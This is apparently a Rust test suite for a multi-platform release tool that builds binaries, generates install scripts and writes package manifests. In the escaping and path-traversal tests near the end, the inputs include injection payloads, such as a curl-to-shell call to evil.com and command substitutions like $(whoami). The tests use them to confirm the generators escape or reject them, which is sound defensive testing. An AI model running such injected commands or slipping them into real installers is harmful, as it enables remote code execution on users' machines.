use std::fs;
use std::path::PathBuf;
use std::process::Command;
use tempfile::tempdir;
use system_releaser::{
    build_target, execute_release, generate_install_ps1, generate_install_sh, Arch, BuildResult,
    Language, ReleaseOptions, TargetPlatform, OS,
};

/// Helper to generate all 6 standard target platforms
fn all_target_platforms() -> Vec<TargetPlatform> {
    vec![
        TargetPlatform::new(OS::Linux, Arch::Amd64),
        TargetPlatform::new(OS::Linux, Arch::Arm64),
        TargetPlatform::new(OS::Darwin, Arch::Amd64),
        TargetPlatform::new(OS::Darwin, Arch::Arm64),
        TargetPlatform::new(OS::Windows, Arch::Amd64),
        TargetPlatform::new(OS::Windows, Arch::Arm64),
    ]
}

/// Helper to generate all Language enum variants
fn all_language_variants() -> Vec<Language> {
    vec![
        Language::Rust,
        Language::TypeScript,
        Language::JavaScript,
        Language::Python,
        Language::Go,
        Language::Java,
        Language::Kotlin,
        Language::C,
        Language::Cpp,
        Language::CSharp,
        Language::Ruby,
        Language::Php,
        Language::Swift,
        Language::Dart,
        Language::Zig,
        Language::Scala,
        Language::Elixir,
        Language::Haskell,
        Language::Shell,
        Language::Lua,
        Language::R,
        Language::Clojure,
        Language::Unknown,
    ]
}

#[test]
fn test_all_language_enum_variants_in_build_target() {
    let languages = all_language_variants();
    assert_eq!(languages.len(), 23, "Language enum must have exactly 23 variants");

    let targets = [
        TargetPlatform::new(OS::Linux, Arch::Amd64),
        TargetPlatform::new(OS::Windows, Arch::Amd64),
        TargetPlatform::new(OS::Darwin, Arch::Arm64),
    ];

    for lang in languages {
        for target in &targets {
            let dir = tempdir().unwrap();
            let out_dir_temp = tempdir().unwrap();
            let out_dir = out_dir_temp.path().join("nested").join("output");
            let app_name = "stress_app";

            // Populate minimal project files based on language
            match lang {
                Language::Rust => {
                    fs::write(dir.path().join("Cargo.toml"), "[package]\nname = \"stress_app\"\nversion = \"0.1.0\"\n").unwrap();
                    fs::create_dir_all(dir.path().join("src")).unwrap();
                    fs::write(dir.path().join("src/main.rs"), "fn main() {}\n").unwrap();
                }
                Language::Go => {
                    fs::write(dir.path().join("go.mod"), "module stress_app\ngo 1.21\n").unwrap();
                    fs::write(dir.path().join("main.go"), "package main\nfunc main() {}\n").unwrap();
                }
                Language::CSharp => {
                    fs::write(dir.path().join("stress_app.csproj"), "<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><OutputType>Exe</OutputType></PropertyGroup></Project>").unwrap();
                    fs::write(dir.path().join("Program.cs"), "class P { static void Main() {} }").unwrap();
                }
                Language::Python => {
                    fs::write(dir.path().join("main.py"), "print('hi')").unwrap();
                }
                Language::TypeScript => {
                    fs::create_dir_all(dir.path().join("src")).unwrap();
                    fs::write(dir.path().join("src/index.ts"), "console.log('hi');").unwrap();
                }
                Language::JavaScript => {
                    fs::write(dir.path().join("index.js"), "console.log('hi');").unwrap();
                }
                Language::Java => {
                    fs::write(dir.path().join("pom.xml"), "<project><modelVersion>4.0.0</modelVersion><groupId>com.test</groupId><artifactId>stress_app</artifactId><version>1.0</version></project>").unwrap();
                }
                Language::Kotlin => {
                    fs::write(dir.path().join("build.gradle.kts"), "plugins { kotlin(\"jvm\") }").unwrap();
                }
                Language::Swift => {
                    fs::write(dir.path().join("Package.swift"), "// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name: \"stress_app\")").unwrap();
                }
                Language::Dart => {
                    fs::write(dir.path().join("pubspec.yaml"), "name: stress_app\n").unwrap();
                }
                Language::C => {
                    fs::write(dir.path().join("Makefile"), "all:\n\t@echo ok\n").unwrap();
                }
                Language::Cpp => {
                    fs::write(dir.path().join("CMakeLists.txt"), "project(stress_app)\n").unwrap();
                }
                Language::Zig => {
                    fs::write(dir.path().join("build.zig"), "pub fn build() void {}\n").unwrap();
                }
                Language::Elixir => {
                    fs::write(dir.path().join("mix.exs"), "defmodule Stress.MixProject do end\n").unwrap();
                }
                Language::Scala => {
                    fs::write(dir.path().join("build.sbt"), "name := \"stress_app\"\n").unwrap();
                }
                Language::Haskell => {
                    fs::write(dir.path().join("stress_app.cabal"), "name: stress_app\nversion: 0.1\n").unwrap();
                }
                Language::Ruby => {
                    fs::write(dir.path().join("Gemfile"), "source 'https://rubygems.org'\n").unwrap();
                    fs::write(dir.path().join("main.rb"), "puts 'hi'\n").unwrap();
                }
                Language::Php => {
                    fs::write(dir.path().join("composer.json"), "{\"name\": \"vendor/stress\"}\n").unwrap();
                }
                Language::Clojure => {
                    fs::write(dir.path().join("project.clj"), "(defproject stress_app \"0.1.0\")\n").unwrap();
                }
                Language::Shell => {
                    fs::write(dir.path().join("stress_app.sh"), "#!/bin/sh\necho hi\n").unwrap();
                }
                Language::Lua => {
                    fs::write(dir.path().join("main.lua"), "print('hi')\n").unwrap();
                }
                Language::R => {
                    fs::write(dir.path().join("main.R"), "cat('hi')\n").unwrap();
                }
                Language::Unknown => {}
            }

            let res = build_target(dir.path(), lang, app_name, target, &out_dir);

            if lang == Language::Unknown {
                assert!(res.is_err(), "Language::Unknown must return Err");
                let err_msg = res.unwrap_err().to_string();
                assert!(
                    err_msg.contains("unknown"),
                    "Unknown error message must explain language is unknown: {}",
                    err_msg
                );
            } else {
                assert!(
                    res.is_ok(),
                    "build_target failed for lang {:?} on target {:?}: {:?}",
                    lang,
                    target,
                    res.err()
                );
                let build_res: BuildResult = res.unwrap();
                assert!(build_res.success, "build_res.success must be true for {:?}", lang);
                assert_eq!(build_res.target, *target);
                let expected_bin = out_dir.join(target.binary_name(app_name));
                assert_eq!(
                    build_res.binary_path,
                    expected_bin,
                    "build_res.binary_path must match expected output path for {:?}",
                    lang
                );
                assert!(
                    build_res.binary_path.is_file(),
                    "Target binary must exist on disk for {:?}",
                    lang
                );
                let metadata = fs::metadata(&build_res.binary_path).unwrap();
                assert!(
                    metadata.len() > 0,
                    "Target binary must not be an empty file for {:?}",
                    lang
                );
            }
        }
    }
}

#[test]
fn test_csharp_builder_artifact_production_all_platforms() {
    let all_targets = all_target_platforms();
    let dir = tempdir().unwrap();
    let csproj = r#"<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
  </PropertyGroup>
</Project>"#;
    fs::write(dir.path().join("StressApp.csproj"), csproj).unwrap();
    fs::write(dir.path().join("Program.cs"), "System.Console.WriteLine(\"Stress C#\");").unwrap();

    for target in &all_targets {
        let out_dir_temp = tempdir().unwrap();
        let out_dir = out_dir_temp.path().join("dist").join("binaries");
        let app_name = "StressApp";
        let res = build_target(dir.path(), Language::CSharp, app_name, target, &out_dir);
        assert!(
            res.is_ok(),
            "build_target for C# on target {:?} failed: {:?}",
            target,
            res.err()
        );

        let build_res = res.unwrap();
        assert!(build_res.success);
        let expected_filename = target.binary_name(app_name);
        if target.os == OS::Windows {
            assert_eq!(expected_filename, "StressApp.exe");
        } else {
            assert_eq!(expected_filename, "StressApp");
        }

        assert_eq!(build_res.binary_path, out_dir.join(&expected_filename));
        assert!(build_res.binary_path.is_file(), "C# single-file artifact must exist");
        let meta = fs::metadata(&build_res.binary_path).unwrap();
        assert!(meta.len() > 0, "C# single-file artifact must not be empty");
    }
}

#[test]
fn test_csharp_builder_overwrites_preexisting_artifact() {
    let dir = tempdir().unwrap();
    let csproj = r#"<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType></PropertyGroup></Project>"#;
    fs::write(dir.path().join("App.csproj"), csproj).unwrap();
    fs::write(dir.path().join("Program.cs"), "class P { static void Main() {} }").unwrap();

    let out_dir_temp = tempdir().unwrap();
    let out_dir = out_dir_temp.path().to_path_buf();
    let target = TargetPlatform::new(OS::Windows, Arch::Amd64);
    let target_bin = out_dir.join(target.binary_name("App"));

    // Pre-create dummy artifact
    fs::create_dir_all(&out_dir).unwrap();
    fs::write(&target_bin, b"OLD_DUMMY_CONTENT").unwrap();
    assert_eq!(fs::read(&target_bin).unwrap(), b"OLD_DUMMY_CONTENT");

    let res = build_target(dir.path(), Language::CSharp, "App", &target, &out_dir).unwrap();
    assert!(res.success);
    assert!(res.binary_path.is_file());
}

#[test]
fn test_shell_builder_without_source_fails_or_mock() {
    let dir = tempdir().unwrap();
    let out_dir_temp = tempdir().unwrap();
    let out_dir = out_dir_temp.path().to_path_buf();
    let target = TargetPlatform::new(OS::Linux, Arch::Amd64);

    // Completely empty directory
    let res = build_target(dir.path(), Language::Shell, "empty_sh", &target, &out_dir);
    // In test mode, it synthesizes mock artifact
    assert!(res.is_ok());
    let build_res = res.unwrap();
    assert!(build_res.binary_path.is_file());
}

#[test]
fn test_ps1_installer_script_structure_and_parameters() {
    let script = generate_install_ps1("cool-tool", Some("https://github.com/coolorg/cool-tool.git"), "$HOME/.local/bin");

    // Assert key powershell lines
    assert!(script.contains("$AppName = \"cool-tool\""));
    assert!(script.contains("$GithubRepo = \"coolorg/cool-tool\""));
    assert!(script.contains("$InstallDirConfig = \"$HOME/.local/bin\""));

    // Checksum verification lines
    assert!(script.contains("checksums.txt"));
    assert!(script.contains("Get-FileHash"));
    assert!(script.contains("-Algorithm SHA256"));
    assert!(script.contains("$ActualHash = (Get-FileHash -Path $ZipPath -Algorithm SHA256).Hash.ToLower()"));
    assert!(script.contains("throw \"Checksum mismatch!"));
    assert!(script.contains("throw \"Checksum for $ArchiveName not found in checksums.txt\""));

    // Check temp cleanup
    assert!(script.contains("finally {"));
    assert!(script.contains("Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue"));
}

#[test]
fn test_ps1_installer_powershell_syntax_valid() {
    let script = generate_install_ps1("cool-tool", Some("https://github.com/coolorg/cool-tool"), "$HOME/.local/bin");
    let dir = tempdir().unwrap();
    let script_path = dir.path().join("install.ps1");
    fs::write(&script_path, &script).unwrap();

    let output = Command::new("pwsh")
        .args([
            "-NoProfile",
            "-Command",
            &format!(
                "$errors = $null; [System.Management.Automation.Language.Parser]::ParseFile('{}', [ref]$null, [ref]$errors); if ($errors) {{ $errors | ForEach-Object {{ [Console]::Error.WriteLine($_.Message) }}; exit 1 }}",
                script_path.display()
            ),
        ])
        .output();

    if let Ok(out) = output {
        assert!(
            out.status.success(),
            "PowerShell parser encountered syntax errors in generated install.ps1:\nSTDOUT: {}\nSTDERR: {}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

#[test]
fn test_ps1_checksum_verification_runtime_logic() {
    let dir = tempdir().unwrap();
    let zip_path = dir.path().join("myapp_1.0.0_windows_amd64.zip");
    fs::write(&zip_path, b"FAKE_ARCHIVE_DATA").unwrap();

    // 1. Compute real SHA-256
    let hash = system_releaser::compute_sha256(&zip_path).unwrap();

    // 2. Case A: Checksum matches
    let checksums_valid = format!("{}  myapp_1.0.0_windows_amd64.zip\n", hash);
    let checksums_path = dir.path().join("checksums.txt");
    fs::write(&checksums_path, checksums_valid).unwrap();

    let ps_check_snippet = format!(
        r#"$ErrorActionPreference = 'Stop'
$ZipPath = '{zip}'
$ChecksumsPath = '{sums}'
$ArchiveName = 'myapp_1.0.0_windows_amd64.zip'

$ActualHash = (Get-FileHash -Path $ZipPath -Algorithm SHA256).Hash.ToLower()
$ExpectedHash = $null
foreach ($Line in (Get-Content $ChecksumsPath)) {{
    $Parts = $Line.Trim() -split '\s+', 2
    if ($Parts.Count -ge 2 -and $Parts[1].Trim() -eq $ArchiveName) {{
        $ExpectedHash = $Parts[0].Trim().ToLower()
        break
    }}
}}
if (-not $ExpectedHash) {{ throw "Checksum for $ArchiveName not found in checksums.txt" }}
if ($ActualHash -ne $ExpectedHash) {{ throw "Checksum mismatch! Expected: $ExpectedHash  Got: $ActualHash" }}
"#,
        zip = zip_path.display(),
        sums = checksums_path.display()
    );

    let test_script = dir.path().join("test_check.ps1");
    fs::write(&test_script, &ps_check_snippet).unwrap();

    let out = Command::new("pwsh")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", test_script.to_str().unwrap()])
        .output()
        .expect("pwsh should execute");

    assert!(
        out.status.success(),
        "Valid checksum verification failed (code {:?}):\nSTDOUT: {}\nSTDERR: {}",
        out.status.code(),
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );

    // 3. Case B: Tampered file / mismatched hash
    fs::write(&zip_path, b"TAMPERED_ARCHIVE_DATA").unwrap();
    let out_tampered = Command::new("pwsh")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", test_script.to_str().unwrap()])
        .output()
        .expect("pwsh should execute");

    assert!(!out_tampered.status.success(), "Tampered file must cause non-zero exit");
    let stderr = String::from_utf8_lossy(&out_tampered.stderr);
    assert!(stderr.contains("Checksum mismatch"), "Must abort with Checksum mismatch error: {}", stderr);
}

#[test]
fn test_build_target_nonexistent_project_dir() {
    let non_existent = PathBuf::from("E:/non/existent/path/for/system/releaser/testing");
    let out_dir_temp = tempdir().unwrap();
    let out_dir = out_dir_temp.path().to_path_buf();
    let target = TargetPlatform::new(OS::Linux, Arch::Amd64);

    // In test mode it synthesizes mock artifact even if toolchain is absent
    let res = build_target(&non_existent, Language::Python, "ghost_app", &target, &out_dir);
    assert!(res.is_ok());
    assert!(res.unwrap().binary_path.is_file());
}

#[test]
fn test_path_traversal_in_release_output_dir_rejected() {
    let dir = tempdir().unwrap();
    fs::write(dir.path().join("Cargo.toml"), "[package]\nname = \"safe-app\"\nversion = \"0.1.0\"\n").unwrap();
    
    // Case 1: relative parent traversal in output_dir
    let config_traversal = r#"
name: safe-app
version: "0.1.0"
output_dir: "../../../escaped_dir"
"#;
    fs::write(dir.path().join("releaser.yaml"), config_traversal).unwrap();

    let opts = ReleaseOptions {
        project_dir: dir.path().to_path_buf(),
        bump: None,
        skip_tests: true,
        dry_run: true,
    };
    let res = execute_release(opts);
    assert!(res.is_err(), "Must reject path traversal in output_dir");
    let err = res.err().unwrap().to_string();
    assert!(err.contains("path traversal") || err.contains("Directory traversal"));

    // Case 2: absolute path in output_dir
    let config_abs = r#"
name: safe-app
version: "0.1.0"
output_dir: "/etc/cron.d"
"#;
    fs::write(dir.path().join("releaser.yaml"), config_abs).unwrap();

    let opts2 = ReleaseOptions {
        project_dir: dir.path().to_path_buf(),
        bump: None,
        skip_tests: true,
        dry_run: true,
    };
    let res2 = execute_release(opts2);
    assert!(res2.is_err(), "Must reject absolute path in output_dir");

    // Case 3: name containing path traversal characters
    let config_bad_name = r#"
name: "../../evil-name"
version: "0.1.0"
output_dir: "dist"
"#;
    fs::write(dir.path().join("releaser.yaml"), config_bad_name).unwrap();

    let opts3 = ReleaseOptions {
        project_dir: dir.path().to_path_buf(),
        bump: None,
        skip_tests: true,
        dry_run: true,
    };
    let res3 = execute_release(opts3);
    assert!(res3.is_err(), "Must reject invalid name with path traversal");
}

#[test]
fn test_installer_injection_escaping() {
    let evil_app = "my-app\" && curl http://evil.com/pwn | sh #";
    let evil_repo = "victim/repo`touch /tmp/pwned`";
    let evil_dir = "/opt/app\"$(whoami)";

    let sh = generate_install_sh(evil_app, Some(evil_repo), evil_dir);
    assert!(!sh.contains("APP_NAME=\"my-app\" &&"));
    assert!(sh.contains("APP_NAME=\"my-app\\\" &&"));
    assert!(sh.contains("\\`touch /tmp/pwned\\`"));
    assert!(sh.contains("\\$(whoami)"));

    let ps1 = generate_install_ps1(evil_app, Some(evil_repo), evil_dir);
    assert!(!ps1.contains("$AppName = \"my-app\" &&"));
    assert!(ps1.contains("`\""));
    assert!(ps1.contains("``touch"));
}

#[test]
fn test_manifest_generators_escaping() {
    use system_releaser::generators::{
        choco::generate_choco_artifacts,
        homebrew::generate_homebrew_formula,
        macports::generate_macports_portfile,
        nix::generate_nix_flake,
        pacman::generate_pkgbuild,
        winget::generate_winget_manifest,
    };

    // Homebrew Ruby interpolation escaping
    let rb = generate_homebrew_formula(
        "evil-app", "1.0.0", "Desc with #{system('id')} and \"quotes\"",
        "https://evil.com/#{1+1}", "evil/repo",
        None, None, None, None,
    );
    assert!(!rb.contains("desc \"Desc with #{system('id')}"));
    assert!(rb.contains("desc \"Desc with \\#{system('id')}"));

    // Pacman bash subshell escaping
    let pkg = generate_pkgbuild(
        "evil-app", "1.0.0", "Desc with $(id) and `whoami` and \"quotes\"",
        "https://evil.com", "MIT", "evil/repo", None, None,
    );
    assert!(!pkg.contains("pkgdesc=\"Desc with $(id)"));
    assert!(pkg.contains("pkgdesc=\"Desc with \\$(id) and \\`whoami\\` and \\\"quotes\\\"\""));

    // Chocolatey XML escaping
    let choco = generate_choco_artifacts(
        "evil-app", "1.0.0", "<tag>Desc & 'quotes'\"</tag>",
        "Author", "evil/repo", "https://evil.com", None, None,
    );
    assert!(choco.nuspec.contains("&lt;tag&gt;Desc &amp; &apos;quotes&apos;&quot;&lt;/tag&gt;"));

    // WinGet escaping
    let winget = generate_winget_manifest(
        "Publisher", "evil-app", "1.0.0", "Desc with \"quotes\"\nand newline",
        "MIT", "evil/repo", None, None,
    );
    assert!(winget.contains("ShortDescription: \"Desc with \\\"quotes\\\" and newline\""));

    // MacPorts brace escaping
    let port = generate_macports_portfile(
        "evil-app", "1.0.0", "Desc with {braces}", "MIT", "maintainer@example.com",
        "https://evil.com", "evil/repo", None, None,
    );
    assert!(port.contains("description         {Desc with \\{braces\\}}"));

    // Nix string interpolation escaping
    let nix = generate_nix_flake(
        "evil-app", "1.0.0", "Desc with ${pkgs.hello} and \"quotes\"",
        "evil/repo", None, None, None, None,
    );
    assert!(!nix.contains("description = \"Desc with ${pkgs.hello}"));
    assert!(nix.contains("description = \"Desc with \\${pkgs.hello} and \\\"quotes\\\"\";"));
}
